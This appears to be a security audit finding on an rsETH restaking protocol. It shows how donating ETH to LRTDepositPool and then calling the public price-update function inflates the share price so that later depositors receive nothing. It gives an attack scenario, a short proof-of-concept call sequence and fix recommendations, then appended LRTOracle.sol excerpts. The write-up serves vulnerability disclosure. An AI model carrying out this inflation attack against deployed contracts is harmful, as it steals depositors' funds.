### Title
rsETH Price Inflation via Direct Asset Donation to LRTDepositPool Manipulates Share Calculation for All Depositors - (File: contracts/LRTOracle.sol)

### Summary
The `LRTOracle._updateRsETHPrice()` function computes `rsETHPrice` using raw token balances of `LRTDepositPool` (via `getTotalAssetDeposits`). Because `LRTDepositPool` has an open `receive()` function and accepts direct ERC20 transfers, an attacker can inflate `totalETHInProtocol` without minting any rsETH. Combined with the publicly callable `updateRSETHPrice()`, this allows an attacker to manipulate the rsETH/ETH exchange rate, causing subsequent depositors to receive far fewer rsETH shares than they are entitled to.

### Finding Description

The rsETH minting formula in `LRTDepositPool.getRsETHAmountToMint()` is:

```
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice()
```

`rsETHPrice` is a stored value updated by the public `updateRSETHPrice()` → `_updateRsETHPrice()`. The price is computed as:

```solidity
uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

`totalETHInProtocol` is assembled in `_getTotalEthInProtocol()` by iterating over supported assets and calling `ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset)`. For ETH, `getETHDistributionData()` returns `address(this).balance` as `ethLyingInDepositPool`. For LSTs, `getAssetDistributionData()` returns `IERC20(asset).balanceOf(address(this))`.

Both of these are raw balances that include any tokens sent directly to the contract — not just tokens deposited through the protocol's deposit functions.

`LRTDepositPool` has an open `receive()` payable function:

```solidity
receive() external payable { }
```

This means anyone can send ETH directly to `LRTDepositPool`, inflating `address(this).balance` and therefore `totalETHInProtocol`, without minting any rsETH. The same applies to LSTs via direct ERC20 transfer.

The price update function `updateRSETHPrice()` has no access control — it is callable by anyone:

```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

The only guard against large price increases is `pricePercentageLimit`, but this defaults to `0` (not set in `initialize()`), meaning the check `pricePercentageLimit > 0 && ...` evaluates to `false` and imposes no restriction.

### Impact Explanation

**Impact: Critical — Direct theft of depositor funds.**

Attack scenario (protocol is new or after all users have withdrawn, `rsethSupply` is tiny):

1. Attacker deposits 1 wei ETH → receives ~1 wei rsETH at price `1e18`. `rsethSupply = 1`.
2. Attacker sends `X` ETH directly to `LRTDepositPool` via `receive()`.
3. Attacker calls `updateRSETHPrice()`. Now `totalETHInProtocol ≈ X * 1e18`, `rsethSupply = 1`, so `rsETHPrice ≈ X * 1e18`.
4. Victim deposits `Y` ETH. `rsethAmountToMint = Y * 1e18 / (X * 1e18) = Y / X`. If `Y < X`, victim receives 0 rsETH (full loss). If `Y ≈ X`, victim receives ~1 wei rsETH.
5. Attacker's 1 wei rsETH now represents `(X + Y)` ETH in the protocol. Attacker withdraws and recovers `X + Y - epsilon`, netting approximately `Y` ETH profit.

The attacker's cost is `X` ETH donated; profit is `Y` ETH stolen from the victim. The attack is profitable whenever `Y > X`, which is trivially achievable by front-running a known large deposit.

### Likelihood Explanation

**Likelihood: Medium.**

- The attack is most effective at protocol launch or after a full withdrawal cycle when `rsethSupply` is near zero.
- `updateRSETHPrice()` is public and permissionless.
- `pricePercentageLimit` is `0` by default (not set in `initialize()`), removing the only on-chain guard.
- The attacker must commit capital (`X` ETH) but recovers it plus the victim's deposit.
- Front-running a large deposit transaction is straightforward on Ethereum.

### Recommendation

1. **Remove raw balance from TVL accounting**: Do not use `address(this).balance` or `IERC20.balanceOf(address(this))` directly as the source of truth for deposited assets. Track deposits and withdrawals explicitly in storage variables so that direct transfers do not affect the price.
2. **Set `pricePercentageLimit` in `initialize()`**: Ensure a non-zero limit is enforced from deployment, not left as an optional admin action.
3. **Seed the protocol with a non-trivial initial deposit**: As recommended in the reference report, ensure `rsethSupply` is large enough at launch that the cost of the attack exceeds any possible gain.
4. **Restrict `updateRSETHPrice()` to authorized callers** or add a time-lock/cooldown to prevent rapid repeated manipulation.

### Proof of Concept

```
// Precondition: rsethSupply == 0 (new protocol or after full withdrawal)
// Step 1: updateRSETHPrice() → rsETHPrice = 1e18, highestRsethPrice = 1e18

// Step 2: Attacker deposits 1 wei ETH
lrtDepositPool.depositETH{value: 1}(0, "");
// rsethSupply = 1 wei rsETH

// Step 3: Attacker donates 1000 ETH directly to LRTDepositPool
(bool ok,) = address(lrtDepositPool).call{value: 1000 ether}("");

// Step 4: Attacker calls updateRSETHPrice()
// totalETHInProtocol ≈ 1000 ether + 1 wei
// rsethSupply = 1 wei
// newRsETHPrice ≈ 1000e18 * 1e18 / 1 = 1000e36 (extreme inflation)
lrtOracle.updateRSETHPrice();

// Step 5: Victim deposits 500 ETH
// rsethAmountToMint = 500e18 * 1e18 / rsETHPrice ≈ 0 (rounds to 0)
// Victim's 500 ETH is absorbed into the protocol, backing attacker's 1 wei rsETH
lrtDepositPool.depositETH{value: 500 ether}(0, ""); // victim gets 0 rsETH

// Step 6: Attacker redeems 1 wei rsETH → recovers ~1500 ETH
```

        address rsETHTokenAddress = lrtConfig.rsETH();
        uint256 rsethSupply = IRSETH(rsETHTokenAddress).totalSupply();

        if (rsethSupply == 0) {
            rsETHPrice = 1 ether;
            highestRsethPrice = 1 ether;
            return;
        }

        if (highestRsethPrice == 0) {
            highestRsethPrice = rsETHPrice;
        }

        uint256 previousPrice = rsETHPrice;

        // get total ETH in the protocol (normalized to 1e18)
        uint256 totalETHInProtocol = _getTotalEthInProtocol();

        // calculate previousTVL using rsethSupply multiplied by rsETHPrice
        uint256 previousTVL = rsethSupply.mulWad(rsETHPrice);

        IPausable lrtDepositPool = IPausable(lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL));
        IPausable withdrawalManager = IPausable(lrtConfig.getContract(LRTConstants.LRT_WITHDRAW_MANAGER));

        // determine if the protocol is active (not paused)
        bool protocolPaused = lrtDepositPool.paused() || withdrawalManager.paused() || paused;

        // only take fee if TVL increased and protocol is not paused
        uint256 protocolFeeInETH = 0;
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
        }

        // compute new rsETH price based on total ETH minus fee
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);

    function _getTotalEthInProtocol() private view returns (uint256 totalETHInProtocol) {
        address lrtDepositPoolAddr = lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL);
        address[] memory supportedAssets = lrtConfig.getSupportedAssetList();
        uint256 supportedAssetCount = supportedAssets.length;

        for (uint16 assetIdx; assetIdx < supportedAssetCount;) {
            address asset = supportedAssets[assetIdx];
            // assetER is in 1e18 precision (1.0 = 1e18)
            uint256 assetER = getAssetPrice(asset);
            // totalAssetAmt is in 1e18 precision (standard token decimals)
            uint256 totalAssetAmt = ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);

            totalETHInProtocol += totalAssetAmt.mulWad(assetER);

            unchecked {
                ++assetIdx;
            }
        }
    }
